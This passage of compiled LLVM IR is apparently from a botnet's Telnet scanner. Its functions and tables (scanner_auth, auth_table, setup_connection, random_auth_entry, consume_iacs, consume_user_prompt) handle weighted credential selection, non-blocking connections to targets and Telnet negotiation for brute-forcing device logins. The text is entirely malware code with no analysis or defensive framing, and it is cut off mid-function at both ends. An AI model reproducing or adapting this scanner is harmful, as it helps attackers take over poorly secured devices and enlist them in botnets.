  %27 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 5
  store i8 %26, i8* %27, align 1
  %28 = load i16, i16* @auth_table_max_weight, align 2
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 2
  store i16 %28, i16* %29, align 8
  %30 = add i16 %28, %2
  %31 = add nsw i32 %22, 1
  store i32 %31, i32* @auth_table_len, align 4
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 3
  store i16 %30, i16* %32, align 2
  store i16 %30, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @setup_connection(%struct.scanner_connection*) unnamed_addr #0 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = bitcast %struct.sockaddr_in* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 16, i32 4, i1 false)
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1
  %5 = load i32, i32* %4, align 8
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %1
  %8 = tail call i32 @close(i32 %5) #10
  br label %9

; <label>:9:                                      ; preds = %1, %7
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  store i32 %10, i32* %4, align 8
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %32, label %12

; <label>:12:                                     ; preds = %9
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  store i32 0, i32* %13, align 4
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  tail call void @util_zero(i8* %14, i32 256) #10
  %15 = load i32, i32* %4, align 8
  %16 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 3, i32 0) #10
  %17 = or i32 %16, 2048
  %18 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %17) #10
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %21 = load i32, i32* %20, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  store i32 %21, i32* %22, align 4
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 5
  %24 = load i16, i16* %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* @fake_time, align 4
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 2
  store i32 %26, i32* %27, align 4
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 3
  store i32 1, i32* %28, align 8
  %29 = load i32, i32* %4, align 8
  %30 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %31 = call i32 @connect(i32 %29, %struct.sockaddr* nonnull %30, i32 16) #10
  br label %32

; <label>:32:                                     ; preds = %9, %12
  ret void
}

declare i32 @select(i32, %struct.fd_set.28*, %struct.fd_set.28*, %struct.fd_set.28*, %struct.timeval.29*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc %struct.scanner_auth* @random_auth_entry() unnamed_addr #5 {
  %1 = load i32, i32* @auth_table_len, align 4
  %2 = icmp sgt i32 %1, 0
  br i1 %2, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %0
  %3 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %4 = sext i32 %1 to i64
  br label %5

; <label>:5:                                      ; preds = %.lr.ph, %13
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %13 ]
  %6 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %3, i64 %indvars.iv, i32 2
  %7 = load i16, i16* %6, align 8
  %8 = icmp eq i16 %7, 0
  br i1 %8, label %9, label %13

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %3, i64 %indvars.iv, i32 3
  %11 = load i16, i16* %10, align 2
  %12 = icmp eq i16 %11, 0
  br i1 %12, label %13, label %._crit_edge9

; <label>:13:                                     ; preds = %9, %5
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %14 = icmp slt i64 %indvars.iv.next, %4
  br i1 %14, label %5, label %._crit_edge.loopexit

._crit_edge9:                                     ; preds = %9
  %15 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %3, i64 %indvars.iv
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %13
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %._crit_edge9, %0
  %.0 = phi %struct.scanner_auth* [ %15, %._crit_edge9 ], [ null, %0 ], [ null, %._crit_edge.loopexit ]
  ret %struct.scanner_auth* %.0
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) local_unnamed_addr #0 {
  %5 = sext i32 %2 to i64
  %6 = tail call i64 @recv(i32 %0, i8* %1, i64 %5, i32 %3) #10
  %7 = trunc i64 %6 to i32
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = and i64 %6, 4294967295
  %min.iters.check = icmp ult i64 %wide.trip.count, 32
  br i1 %min.iters.check, label %.lr.ph.preheader77, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %n.mod.vf = and i64 %6, 31
  %n.vec = sub nsw i64 %wide.trip.count, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.lr.ph.preheader77, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %pred.store.continue76
  %index = phi i64 [ %index.next, %pred.store.continue76 ], [ 0, %vector.body.preheader ]
  %9 = getelementptr inbounds i8, i8* %1, i64 %index
  %10 = bitcast i8* %9 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %10, align 1
  %11 = getelementptr i8, i8* %9, i64 16
  %12 = bitcast i8* %11 to <16 x i8>*
  %wide.load14 = load <16 x i8>, <16 x i8>* %12, align 1
  %13 = icmp eq <16 x i8> %wide.load, zeroinitializer
  %14 = icmp eq <16 x i8> %wide.load14, zeroinitializer
  %15 = extractelement <16 x i1> %13, i32 0
  br i1 %15, label %pred.store.if, label %pred.store.continue

pred.store.if:                                    ; preds = %vector.body
  %16 = getelementptr inbounds i8, i8* %1, i64 %index
  store i8 65, i8* %16, align 1
  br label %pred.store.continue

pred.store.continue:                              ; preds = %pred.store.if, %vector.body
  %17 = extractelement <16 x i1> %13, i32 1
  br i1 %17, label %pred.store.if15, label %pred.store.continue16

pred.store.if15:                                  ; preds = %pred.store.continue
  %18 = or i64 %index, 1
  %19 = getelementptr inbounds i8, i8* %1, i64 %18
  store i8 65, i8* %19, align 1
  br label %pred.store.continue16

pred.store.continue16:                            ; preds = %pred.store.if15, %pred.store.continue
  %20 = extractelement <16 x i1> %13, i32 2
  br i1 %20, label %pred.store.if17, label %pred.store.continue18

pred.store.if17:                                  ; preds = %pred.store.continue16
  %21 = or i64 %index, 2
  %22 = getelementptr inbounds i8, i8* %1, i64 %21
  store i8 65, i8* %22, align 1
  br label %pred.store.continue18

pred.store.continue18:                            ; preds = %pred.store.if17, %pred.store.continue16
  %23 = extractelement <16 x i1> %13, i32 3
  br i1 %23, label %pred.store.if19, label %pred.store.continue20

pred.store.if19:                                  ; preds = %pred.store.continue18
  %24 = or i64 %index, 3
  %25 = getelementptr inbounds i8, i8* %1, i64 %24
  store i8 65, i8* %25, align 1
  br label %pred.store.continue20

pred.store.continue20:                            ; preds = %pred.store.if19, %pred.store.continue18
  %26 = extractelement <16 x i1> %13, i32 4
  br i1 %26, label %pred.store.if21, label %pred.store.continue22

pred.store.if21:                                  ; preds = %pred.store.continue20
  %27 = or i64 %index, 4
  %28 = getelementptr inbounds i8, i8* %1, i64 %27
  store i8 65, i8* %28, align 1
  br label %pred.store.continue22

pred.store.continue22:                            ; preds = %pred.store.if21, %pred.store.continue20
  %29 = extractelement <16 x i1> %13, i32 5
  br i1 %29, label %pred.store.if23, label %pred.store.continue24

pred.store.if23:                                  ; preds = %pred.store.continue22
  %30 = or i64 %index, 5
  %31 = getelementptr inbounds i8, i8* %1, i64 %30
  store i8 65, i8* %31, align 1
  br label %pred.store.continue24

pred.store.continue24:                            ; preds = %pred.store.if23, %pred.store.continue22
  %32 = extractelement <16 x i1> %13, i32 6
  br i1 %32, label %pred.store.if25, label %pred.store.continue26

pred.store.if25:                                  ; preds = %pred.store.continue24
  %33 = or i64 %index, 6
  %34 = getelementptr inbounds i8, i8* %1, i64 %33
  store i8 65, i8* %34, align 1
  br label %pred.store.continue26

pred.store.continue26:                            ; preds = %pred.store.if25, %pred.store.continue24
  %35 = extractelement <16 x i1> %13, i32 7
  br i1 %35, label %pred.store.if27, label %pred.store.continue28

pred.store.if27:                                  ; preds = %pred.store.continue26
  %36 = or i64 %index, 7
  %37 = getelementptr inbounds i8, i8* %1, i64 %36
  store i8 65, i8* %37, align 1
  br label %pred.store.continue28

pred.store.continue28:                            ; preds = %pred.store.if27, %pred.store.continue26
  %38 = extractelement <16 x i1> %13, i32 8
  br i1 %38, label %pred.store.if29, label %pred.store.continue30

pred.store.if29:                                  ; preds = %pred.store.continue28
  %39 = or i64 %index, 8
  %40 = getelementptr inbounds i8, i8* %1, i64 %39
  store i8 65, i8* %40, align 1
  br label %pred.store.continue30

pred.store.continue30:                            ; preds = %pred.store.if29, %pred.store.continue28
  %41 = extractelement <16 x i1> %13, i32 9
  br i1 %41, label %pred.store.if31, label %pred.store.continue32

pred.store.if31:                                  ; preds = %pred.store.continue30
  %42 = or i64 %index, 9
  %43 = getelementptr inbounds i8, i8* %1, i64 %42
  store i8 65, i8* %43, align 1
  br label %pred.store.continue32

pred.store.continue32:                            ; preds = %pred.store.if31, %pred.store.continue30
  %44 = extractelement <16 x i1> %13, i32 10
  br i1 %44, label %pred.store.if33, label %pred.store.continue34

pred.store.if33:                                  ; preds = %pred.store.continue32
  %45 = or i64 %index, 10
  %46 = getelementptr inbounds i8, i8* %1, i64 %45
  store i8 65, i8* %46, align 1
  br label %pred.store.continue34

pred.store.continue34:                            ; preds = %pred.store.if33, %pred.store.continue32
  %47 = extractelement <16 x i1> %13, i32 11
  br i1 %47, label %pred.store.if35, label %pred.store.continue36

pred.store.if35:                                  ; preds = %pred.store.continue34
  %48 = or i64 %index, 11
  %49 = getelementptr inbounds i8, i8* %1, i64 %48
  store i8 65, i8* %49, align 1
  br label %pred.store.continue36

pred.store.continue36:                            ; preds = %pred.store.if35, %pred.store.continue34
  %50 = extractelement <16 x i1> %13, i32 12
  br i1 %50, label %pred.store.if37, label %pred.store.continue38

pred.store.if37:                                  ; preds = %pred.store.continue36
  %51 = or i64 %index, 12
  %52 = getelementptr inbounds i8, i8* %1, i64 %51
  store i8 65, i8* %52, align 1
  br label %pred.store.continue38

pred.store.continue38:                            ; preds = %pred.store.if37, %pred.store.continue36
  %53 = extractelement <16 x i1> %13, i32 13
  br i1 %53, label %pred.store.if39, label %pred.store.continue40

pred.store.if39:                                  ; preds = %pred.store.continue38
  %54 = or i64 %index, 13
  %55 = getelementptr inbounds i8, i8* %1, i64 %54
  store i8 65, i8* %55, align 1
  br label %pred.store.continue40

pred.store.continue40:                            ; preds = %pred.store.if39, %pred.store.continue38
  %56 = extractelement <16 x i1> %13, i32 14
  br i1 %56, label %pred.store.if41, label %pred.store.continue42

pred.store.if41:                                  ; preds = %pred.store.continue40
  %57 = or i64 %index, 14
  %58 = getelementptr inbounds i8, i8* %1, i64 %57
  store i8 65, i8* %58, align 1
  br label %pred.store.continue42

pred.store.continue42:                            ; preds = %pred.store.if41, %pred.store.continue40
  %59 = extractelement <16 x i1> %13, i32 15
  br i1 %59, label %pred.store.if43, label %pred.store.continue44

pred.store.if43:                                  ; preds = %pred.store.continue42
  %60 = or i64 %index, 15
  %61 = getelementptr inbounds i8, i8* %1, i64 %60
  store i8 65, i8* %61, align 1
  br label %pred.store.continue44

pred.store.continue44:                            ; preds = %pred.store.if43, %pred.store.continue42
  %62 = extractelement <16 x i1> %14, i32 0
  br i1 %62, label %pred.store.if45, label %pred.store.continue46

pred.store.if45:                                  ; preds = %pred.store.continue44
  %63 = or i64 %index, 16
  %64 = getelementptr inbounds i8, i8* %1, i64 %63
  store i8 65, i8* %64, align 1
  br label %pred.store.continue46

pred.store.continue46:                            ; preds = %pred.store.if45, %pred.store.continue44
  %65 = extractelement <16 x i1> %14, i32 1
  br i1 %65, label %pred.store.if47, label %pred.store.continue48

pred.store.if47:                                  ; preds = %pred.store.continue46
  %66 = or i64 %index, 17
  %67 = getelementptr inbounds i8, i8* %1, i64 %66
  store i8 65, i8* %67, align 1
  br label %pred.store.continue48

pred.store.continue48:                            ; preds = %pred.store.if47, %pred.store.continue46
  %68 = extractelement <16 x i1> %14, i32 2
  br i1 %68, label %pred.store.if49, label %pred.store.continue50

pred.store.if49:                                  ; preds = %pred.store.continue48
  %69 = or i64 %index, 18
  %70 = getelementptr inbounds i8, i8* %1, i64 %69
  store i8 65, i8* %70, align 1
  br label %pred.store.continue50

pred.store.continue50:                            ; preds = %pred.store.if49, %pred.store.continue48
  %71 = extractelement <16 x i1> %14, i32 3
  br i1 %71, label %pred.store.if51, label %pred.store.continue52

pred.store.if51:                                  ; preds = %pred.store.continue50
  %72 = or i64 %index, 19
  %73 = getelementptr inbounds i8, i8* %1, i64 %72
  store i8 65, i8* %73, align 1
  br label %pred.store.continue52

pred.store.continue52:                            ; preds = %pred.store.if51, %pred.store.continue50
  %74 = extractelement <16 x i1> %14, i32 4
  br i1 %74, label %pred.store.if53, label %pred.store.continue54

pred.store.if53:                                  ; preds = %pred.store.continue52
  %75 = or i64 %index, 20
  %76 = getelementptr inbounds i8, i8* %1, i64 %75
  store i8 65, i8* %76, align 1
  br label %pred.store.continue54

pred.store.continue54:                            ; preds = %pred.store.if53, %pred.store.continue52
  %77 = extractelement <16 x i1> %14, i32 5
  br i1 %77, label %pred.store.if55, label %pred.store.continue56

pred.store.if55:                                  ; preds = %pred.store.continue54
  %78 = or i64 %index, 21
  %79 = getelementptr inbounds i8, i8* %1, i64 %78
  store i8 65, i8* %79, align 1
  br label %pred.store.continue56

pred.store.continue56:                            ; preds = %pred.store.if55, %pred.store.continue54
  %80 = extractelement <16 x i1> %14, i32 6
  br i1 %80, label %pred.store.if57, label %pred.store.continue58

pred.store.if57:                                  ; preds = %pred.store.continue56
  %81 = or i64 %index, 22
  %82 = getelementptr inbounds i8, i8* %1, i64 %81
  store i8 65, i8* %82, align 1
  br label %pred.store.continue58

pred.store.continue58:                            ; preds = %pred.store.if57, %pred.store.continue56
  %83 = extractelement <16 x i1> %14, i32 7
  br i1 %83, label %pred.store.if59, label %pred.store.continue60

pred.store.if59:                                  ; preds = %pred.store.continue58
  %84 = or i64 %index, 23
  %85 = getelementptr inbounds i8, i8* %1, i64 %84
  store i8 65, i8* %85, align 1
  br label %pred.store.continue60

pred.store.continue60:                            ; preds = %pred.store.if59, %pred.store.continue58
  %86 = extractelement <16 x i1> %14, i32 8
  br i1 %86, label %pred.store.if61, label %pred.store.continue62

pred.store.if61:                                  ; preds = %pred.store.continue60
  %87 = or i64 %index, 24
  %88 = getelementptr inbounds i8, i8* %1, i64 %87
  store i8 65, i8* %88, align 1
  br label %pred.store.continue62

pred.store.continue62:                            ; preds = %pred.store.if61, %pred.store.continue60
  %89 = extractelement <16 x i1> %14, i32 9
  br i1 %89, label %pred.store.if63, label %pred.store.continue64

pred.store.if63:                                  ; preds = %pred.store.continue62
  %90 = or i64 %index, 25
  %91 = getelementptr inbounds i8, i8* %1, i64 %90
  store i8 65, i8* %91, align 1
  br label %pred.store.continue64

pred.store.continue64:                            ; preds = %pred.store.if63, %pred.store.continue62
  %92 = extractelement <16 x i1> %14, i32 10
  br i1 %92, label %pred.store.if65, label %pred.store.continue66

pred.store.if65:                                  ; preds = %pred.store.continue64
  %93 = or i64 %index, 26
  %94 = getelementptr inbounds i8, i8* %1, i64 %93
  store i8 65, i8* %94, align 1
  br label %pred.store.continue66

pred.store.continue66:                            ; preds = %pred.store.if65, %pred.store.continue64
  %95 = extractelement <16 x i1> %14, i32 11
  br i1 %95, label %pred.store.if67, label %pred.store.continue68

pred.store.if67:                                  ; preds = %pred.store.continue66
  %96 = or i64 %index, 27
  %97 = getelementptr inbounds i8, i8* %1, i64 %96
  store i8 65, i8* %97, align 1
  br label %pred.store.continue68

pred.store.continue68:                            ; preds = %pred.store.if67, %pred.store.continue66
  %98 = extractelement <16 x i1> %14, i32 12
  br i1 %98, label %pred.store.if69, label %pred.store.continue70

pred.store.if69:                                  ; preds = %pred.store.continue68
  %99 = or i64 %index, 28
  %100 = getelementptr inbounds i8, i8* %1, i64 %99
  store i8 65, i8* %100, align 1
  br label %pred.store.continue70

pred.store.continue70:                            ; preds = %pred.store.if69, %pred.store.continue68
  %101 = extractelement <16 x i1> %14, i32 13
  br i1 %101, label %pred.store.if71, label %pred.store.continue72

pred.store.if71:                                  ; preds = %pred.store.continue70
  %102 = or i64 %index, 29
  %103 = getelementptr inbounds i8, i8* %1, i64 %102
  store i8 65, i8* %103, align 1
  br label %pred.store.continue72

pred.store.continue72:                            ; preds = %pred.store.if71, %pred.store.continue70
  %104 = extractelement <16 x i1> %14, i32 14
  br i1 %104, label %pred.store.if73, label %pred.store.continue74

pred.store.if73:                                  ; preds = %pred.store.continue72
  %105 = or i64 %index, 30
  %106 = getelementptr inbounds i8, i8* %1, i64 %105
  store i8 65, i8* %106, align 1
  br label %pred.store.continue74

pred.store.continue74:                            ; preds = %pred.store.if73, %pred.store.continue72
  %107 = extractelement <16 x i1> %14, i32 15
  br i1 %107, label %pred.store.if75, label %pred.store.continue76

pred.store.if75:                                  ; preds = %pred.store.continue74
  %108 = or i64 %index, 31
  %109 = getelementptr inbounds i8, i8* %1, i64 %108
  store i8 65, i8* %109, align 1
  br label %pred.store.continue76

pred.store.continue76:                            ; preds = %pred.store.if75, %pred.store.continue74
  %index.next = add i64 %index, 32
  %110 = icmp eq i64 %index.next, %n.vec
  br i1 %110, label %middle.block, label %vector.body, !llvm.loop !10

middle.block:                                     ; preds = %pred.store.continue76
  %cmp.n = icmp eq i64 %n.mod.vf, 0
  br i1 %cmp.n, label %.loopexit, label %.lr.ph.preheader77

.lr.ph.preheader77:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %indvars.iv.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %n.vec, %middle.block ]
  %111 = sub i64 %6, %indvars.iv.ph
  %112 = add nsw i64 %wide.trip.count, -1
  %113 = sub nsw i64 %112, %indvars.iv.ph
  %xtraiter = and i64 %111, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader77
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %118, %.lr.ph.prol.preheader
  %indvars.iv.prol = phi i64 [ %indvars.iv.next.prol, %118 ], [ %indvars.iv.ph, %.lr.ph.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %118 ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %114 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.prol
  %115 = load i8, i8* %114, align 1
  %116 = icmp eq i8 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %.lr.ph.prol
  store i8 65, i8* %114, align 1
  br label %118

; <label>:118:                                    ; preds = %117, %.lr.ph.prol
  %indvars.iv.next.prol = add nuw nsw i64 %indvars.iv.prol, 1
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !11

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %118
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader77, %.lr.ph.prol.loopexit.unr-lcssa
  %indvars.iv.unr = phi i64 [ %indvars.iv.ph, %.lr.ph.preheader77 ], [ %indvars.iv.next.prol, %.lr.ph.prol.loopexit.unr-lcssa ]
  %119 = icmp ult i64 %113, 3
  br i1 %119, label %.loopexit.loopexit, label %.lr.ph.preheader77.new

.lr.ph.preheader77.new:                           ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %136, %.lr.ph.preheader77.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader77.new ], [ %indvars.iv.next.3, %136 ]
  %120 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv
  %121 = load i8, i8* %120, align 1
  %122 = icmp eq i8 %121, 0
  br i1 %122, label %123, label %.lr.ph.178

; <label>:123:                                    ; preds = %.lr.ph
  store i8 65, i8* %120, align 1
  br label %.lr.ph.178

.lr.ph.178:                                       ; preds = %.lr.ph, %123
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %124 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next
  %125 = load i8, i8* %124, align 1
  %126 = icmp eq i8 %125, 0
  br i1 %126, label %127, label %.lr.ph.279

.loopexit.loopexit.unr-lcssa:                     ; preds = %136
  br label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph.prol.loopexit, %.loopexit.loopexit.unr-lcssa
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %middle.block, %4
  ret i32 %7

; <label>:127:                                    ; preds = %.lr.ph.178
  store i8 65, i8* %124, align 1
  br label %.lr.ph.279

.lr.ph.279:                                       ; preds = %127, %.lr.ph.178
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %128 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.1
  %129 = load i8, i8* %128, align 1
  %130 = icmp eq i8 %129, 0
  br i1 %130, label %131, label %.lr.ph.380

; <label>:131:                                    ; preds = %.lr.ph.279
  store i8 65, i8* %128, align 1
  br label %.lr.ph.380

.lr.ph.380:                                       ; preds = %131, %.lr.ph.279
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %132 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.2
  %133 = load i8, i8* %132, align 1
  %134 = icmp eq i8 %133, 0
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %.lr.ph.380
  store i8 65, i8* %132, align 1
  br label %136

; <label>:136:                                    ; preds = %135, %.lr.ph.380
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %exitcond.3 = icmp eq i64 %indvars.iv.next.3, %wide.trip.count
  br i1 %exitcond.3, label %.loopexit.loopexit.unr-lcssa, label %.lr.ph, !llvm.loop !13
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_iacs(%struct.scanner_connection*) unnamed_addr #0 {
  %2 = alloca [3 x i8], align 1
  %3 = alloca [9 x i8], align 1
  %4 = getelementptr inbounds [3 x i8], [3 x i8]* %2, i64 0, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  %6 = load i32, i32* %5, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %1
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1
  %10 = getelementptr inbounds [9 x i8], [9 x i8]* %3, i64 0, i64 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %.backedge
  %.03135 = phi i8* [ %8, %.lr.ph ], [ %.031.be, %.backedge ]
  %.03234 = phi i32 [ 0, %.lr.ph ], [ %.032.be, %.backedge ]
  %12 = load i8, i8* %.03135, align 1
  %13 = icmp eq i8 %12, -1
  br i1 %13, label %14, label %._crit_edge.loopexit

; <label>:14:                                     ; preds = %11
  %15 = call fastcc signext i8 @can_consume(%struct.scanner_connection* nonnull %0, i8* nonnull %.03135, i32 1)
  %16 = icmp eq i8 %15, 0
  br i1 %16, label %._crit_edge.loopexit, label %17

; <label>:17:                                     ; preds = %14
  %18 = getelementptr inbounds i8, i8* %.03135, i64 1
  %19 = load i8, i8* %18, align 1
  switch i8 %19, label %39 [
    i8 -1, label %20
    i8 -3, label %25
  ]

; <label>:20:                                     ; preds = %17
  %21 = getelementptr inbounds i8, i8* %.03135, i64 2
  %22 = add nsw i32 %.03234, 2
  br label %.backedge

.backedge:                                        ; preds = %20, %32, %49
  %.032.be = phi i32 [ %22, %20 ], [ %53, %49 ], [ %34, %32 ]
  %.031.be = phi i8* [ %21, %20 ], [ %52, %49 ], [ %33, %32 ]
  %23 = load i32, i32* %5, align 4
  %24 = icmp slt i32 %.032.be, %23
  br i1 %24, label %11, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %17
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i64 0, i64 0), i64 3, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %10, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i64 0, i64 0), i64 9, i32 1, i1 false)
  %26 = call fastcc signext i8 @can_consume(%struct.scanner_connection* nonnull %0, i8* nonnull %.03135, i32 2)
  %27 = icmp eq i8 %26, 0
  br i1 %27, label %._crit_edge.loopexit, label %28

; <label>:28:                                     ; preds = %25
  %29 = getelementptr inbounds i8, i8* %.03135, i64 2
  %30 = load i8, i8* %29, align 1
  %31 = icmp eq i8 %30, 31
  br i1 %31, label %32, label %39

; <label>:32:                                     ; preds = %28
  %33 = getelementptr inbounds i8, i8* %.03135, i64 3
  %34 = add nsw i32 %.03234, 3
  %35 = load i32, i32* %9, align 8
  %36 = call i64 @send(i32 %35, i8* nonnull %4, i64 3, i32 16384) #10
  %37 = load i32, i32* %9, align 8
  %38 = call i64 @send(i32 %37, i8* nonnull %10, i64 9, i32 16384) #10
  br label %.backedge

; <label>:39:                                     ; preds = %17, %28
  %40 = call fastcc signext i8 @can_consume(%struct.scanner_connection* %0, i8* nonnull %.03135, i32 2)
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %._crit_edge.loopexit, label %.preheader.preheader

.preheader.preheader:                             ; preds = %39
  %42 = load i8, i8* %.03135, align 1
  switch i8 %42, label %.preheader.144 [
    i8 -3, label %43
    i8 -5, label %.sink.split
  ]

; <label>:43:                                     ; preds = %.preheader.preheader
  br label %.sink.split

.sink.split:                                      ; preds = %.preheader.preheader, %43
  %.sink = phi i8 [ -4, %43 ], [ -3, %.preheader.preheader ]
  store i8 %.sink, i8* %.03135, align 1
  br label %.preheader.144

.preheader.144:                                   ; preds = %.preheader.preheader, %.sink.split
  %44 = load i8, i8* %18, align 1
  switch i8 %44, label %.preheader.245 [
    i8 -3, label %45
    i8 -5, label %.sink.split.1
  ]

._crit_edge.loopexit:                             ; preds = %25, %39, %14, %11, %.backedge
  %.032.lcssa.ph = phi i32 [ %.03234, %25 ], [ %.03234, %39 ], [ %.03234, %14 ], [ %.03234, %11 ], [ %.032.be, %.backedge ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.032.lcssa = phi i32 [ 0, %1 ], [ %.032.lcssa.ph, %._crit_edge.loopexit ]
  ret i32 %.032.lcssa

; <label>:45:                                     ; preds = %.preheader.144
  br label %.sink.split.1

.sink.split.1:                                    ; preds = %45, %.preheader.144
  %.sink.1 = phi i8 [ -4, %45 ], [ -3, %.preheader.144 ]
  store i8 %.sink.1, i8* %18, align 1
  br label %.preheader.245

.preheader.245:                                   ; preds = %.sink.split.1, %.preheader.144
  %46 = getelementptr inbounds i8, i8* %.03135, i64 2
  %47 = load i8, i8* %46, align 1
  switch i8 %47, label %49 [
    i8 -3, label %48
    i8 -5, label %.sink.split.2
  ]

; <label>:48:                                     ; preds = %.preheader.245
  br label %.sink.split.2

.sink.split.2:                                    ; preds = %48, %.preheader.245
  %.sink.2 = phi i8 [ -4, %48 ], [ -3, %.preheader.245 ]
  store i8 %.sink.2, i8* %46, align 1
  br label %49

; <label>:49:                                     ; preds = %.sink.split.2, %.preheader.245
  %50 = load i32, i32* %9, align 8
  %51 = call i64 @send(i32 %50, i8* nonnull %.03135, i64 3, i32 16384) #10
  %52 = getelementptr inbounds i8, i8* %.03135, i64 3
  %53 = add nsw i32 %.03234, 3
  br label %.backedge
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc i32 @consume_user_prompt(%struct.scanner_connection* nocapture readonly) unnamed_addr #9 {
  %2 = alloca i32, align 4
